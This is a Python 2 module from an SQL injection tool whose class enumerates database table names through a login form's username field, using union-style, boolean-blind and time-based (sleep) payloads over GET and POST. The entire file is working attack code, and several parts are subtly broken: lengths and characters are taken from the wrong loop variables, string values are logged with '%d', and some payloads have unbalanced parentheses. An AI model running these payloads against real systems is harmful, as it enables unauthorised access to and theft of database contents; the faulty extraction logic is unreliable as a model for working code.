#!/usr/bin/env python
# -*- coding:utf-8 -*-
from config import UnpackFunction
from lib.log import logger
from database import SqliDatabases

__author__ = "LoRexxar"


# 获取表名
class SqliTables(SqliDatabases):
    def __init__(self):
        SqliDatabases.__init__(self)
        if self.databases_name == 0:
            SqliDatabases.get_database(self)
        self.tables_name = []

    def get_tables(self):

        tables_name =""

        # 每个databases_name需要跑一次tables_name
        for database_name in self.databases_name:
            # 开始跑database_name
            logger.info("Start sqli databases %s " % self.database)

        if self.sqlirequest == "GET":
            logger.info("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                # 先注tables的数量
                payload = "username=admi' or SELECT COUNT(*) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1%23&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                tables_number = int(UnpackFunction(r))
                logger.info("Tables account sqli success...The tables_number is %d..." % tables_number)
                print "[*] tables_number: %d" % tables_number

                # 每个循环跑一次tables的数据
                for i in range(0, int(tables_number)):
                    # 首先是tablename的长度
                    payload = "username=a' or SELECT length(table_name) from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
                    r = self.Data.GetData(payload)
                    tables_name_len = int(UnpackFunction(r))
                    logger.info("Tables name length sqli success...The tables_name_len is %d..." % tables_name_len)
                    print "[*] tables_name_len: %d" % tables_name_len

                    # 然后注tablename
                    payload = "username=ad' or SELECT table_name from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(i) + ",1)%23&passwd=ddog123&submit=Log+In"
                    r = self.Data.GetData(payload)
                    tables_name = UnpackFunction(r)
                    logger.info("Tables name sqli success...The databases_name is %d..." % databases_name)
                    # 把tables_name插入列表
                    self.tables_name.append(tables_name)
                    print "[*] tables_name: %s" % tables_name

            elif self.sqlimethod == "build":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                for i in range(0, 100):
                    # 先注tables的数量
                    payload = "username=admi' or SElECT ((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(i) + ")%23&passwd=ddog123&submit=Log+In"
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        tables_number = i
                        break

                logger.info("Tables amount sqli success...The tables_number is %d..." % tables_number)
                print "[*] tables_number: %d" % tables_number

                for i in range(0, int(tables_number)):
                    # 然后注tables_name 的 length
                    for j in range(0, 30):
                        payload = "username=admi' or select ((SELECT length(table_name) from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(i) + ",1) > " + repr(j) + ")%23&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            tables_name_len = i
                            break

                    logger.info("Tables name length sqli success...The database_len is %d..." % tables_name_len)
                    print "[*] tables_name_len: %d" % tables_name_len

                    # 然后注tables名字
                    for j in range(0, int(tables_name_len)):
                        for k in range(30, 130):
                            payload = "username=admi' or select (SELECT ascii(substring(table_name," + repr(
                                j + 1) + ",1)) from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(
                                i) + ",1) >" + repr(k) + "))%23&passwd=ddog123&submit=Log+In"
                            if self.Data.GetBuildData(payload, self.len) == 0:
                                tables_name += chr(int(j))
                                break

                    logger.info("Tables name sqli success...The tables_name is %d..." % tables_name)
                    # 把tables_name插入列表
                    self.tables_name.append(tables_name)
                    print "[*] tables_name:" + tables_name

            elif self.sqlimethod == "time":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                for i in range(0, 100):

                    # 先注tables的数量
                    payload = "username=admi' or SELECT if((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(i) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        tables_number = i
                        break

                logger.info("Tables amount sqli success...The tables_number is %d..." % tables_number)
                print "[*] tables_number: %d" % tables_number

                for i in range(0, int(tables_number)):
                    # 然后注tables_number 的length
                    for j in range(0, 30):
                        payload = "username=admi' or SELECT if((SELECT length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"

                        if self.Data.GetTimeData(payload, self.time) == 0:
                            tables_name_len = i
                            break

                    logger.info("Tables name length sqli success...The tables_name_len is %d..." % tables_name_len)
                    print "[*] tables_name_len: %d" % tables_name_len

                    # 然后注tables名字
                    for j in range(0, int(tables_name_len)):
                        for k in range(30, 130):
                            payload = "username=admi' or SELECT if((SELECT  ascii(substring(table_name," + repr(j + 1) + ",1)) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"

                            if self.Data.GetTimeData(payload, self.time) == 0:
                                tables_name += chr(int(j))
                                break

                    logger.info("Tables name sqli success...The tables_name is %d..." % tables_name)
                    # 把tables_name插入列表
                    self.tables_name.append(tables_name)
                    print "[*] tables_name:" + tables_name

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.info("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)

            if self.sqlimethod == "normal":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                # 先注tables的数量
                payload = {"username": "admi' or SELECT COUNT(*) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1%23", "passwd": "ddog123"}
                r = self.Data.PostData(payload)
                tables_number = int(UnpackFunction(r))
                logger.info("Tables account sqli success...The tables_number is %d..." % tables_number)
                print "[*] tables_number: %d" % tables_number

                # 每个循环跑一次tables的数据
                for i in range(0, int(tables_number)):
                    # 首先是tablename的长度
                    payload = {"username":"a' or SELECT length(table_name) from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(
                        i) + ",1%23", "passwd": "ddog123&submit=Log+In"}
                    r = self.Data.PostData(payload)
                    tables_name_len = int(UnpackFunction(r))
                    logger.info("Tables name length sqli success...The tables_name_len is %d..." % tables_name_len)
                    print "[*] tables_name_len: %d" % tables_name_len

                    # 然后注tablename
                    payload = {"username": "ad' or SELECT table_name from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(
                        i) + ",1)%23", "passwd": "ddog123"}
                    r = self.Data.PostData(payload)
                    tables_name = UnpackFunction(r)
                    logger.info("Tables name sqli success...The tables_name is %d..." % tables_name)
                    # 把tables_name插入列表
                    self.tables_name.append(tables_name)
                    print "[*] tables_name: %s" % tables_name

            elif self.sqlimethod == "build":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                for i in range(0, 100):
                    # 先注tables的数量
                    payload = {"username": "admi' or SElECT ((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(
                        i) + ")%23", "passwd": "ddog123"}
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        tables_number = i
                        break

                logger.info("Tables amount sqli success...The tables_number is %d..." % tables_number)
                print "[*] tables_number: %d" % tables_number

                for i in range(0, int(tables_number)):
                    # 然后注tables_name 的 length
                    for j in range(0, 30):
                        payload = {"username": "admi' or select ((SELECT length(table_name) from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(
                            i) + ",1) > " + repr(j) + ")%23", "passwd": "ddog123"}
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            tables_name_len = i
                            break

                    logger.info("Tables name length sqli success...The tables_name_len is %d..." % tables_name_len)
                    print "[*] tables_name_len: %d" % tables_name_len

                    # 然后注tables名字
                    for j in range(0, int(tables_name_len)):
                        for k in range(30, 130):
                            payload = {"username": "admi' or select (SELECT ascii(substring(table_name," + repr(
                                j + 1) + ",1)) from information_schema.tables WHERE table_schema = " + database_name + " limit " + repr(
                                i) + ",1) >" + repr(k) + "))%23", "passwd": "ddog123"}
                            if self.Data.PostBuildData(payload, self.len) == 0:
                                tables_name += chr(int(j))
                                break

                    logger.info("Tables name sqli success...The tables_name is %d..." % tables_name)
                    # 把tables_name插入列表
                    self.tables_name.append(tables_name)
                    print "[*] tables_name:" + tables_name

            elif self.sqlimethod == "time":

                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                for i in range(0, 100):

                    # 先注tables的数量
                    payload = {"username": "admi' or SELECT if((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(
                        i) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        tables_number = i
                        break

                logger.info("Tables amount sqli success...The tables_number is %d..." % tables_number)
                print "[*] tables_number: %d" % tables_number

                for i in range(0, int(tables_number)):
                    # 然后注tables_number 的length
                    for j in range(0, 30):
                        payload = {"username": "admi' or SELECT if((SELECT length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
                            i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}

                        if self.Data.PostTimeData(payload, self.time) == 0:
                            tables_name_len = i
                            break

                    logger.info("Tables name length sqli success...The tables_name_len is %d..." % tables_name_len)
                    print "[*] tables_name_len: %d" % tables_name_len

                    # 然后注tables名字
                    for j in range(0, int(tables_name_len)):
                        for k in range(30, 130):
                            payload = {"username": "admi' or SELECT if((SELECT  ascii(substring(table_name," + repr(
                                j + 1) + ",1)) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
                                i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}

                            if self.Data.PostTimeData(payload, self.time) == 0:
                                tables_name += chr(int(j))
                                break

                    logger.info("Tables name sqli success...The tables_name is %d..." % tables_name)
                    # 把tables_name插入列表
                    self.tables_name.append(tables_name)
                    print "[*] tables_name:" + tables_name
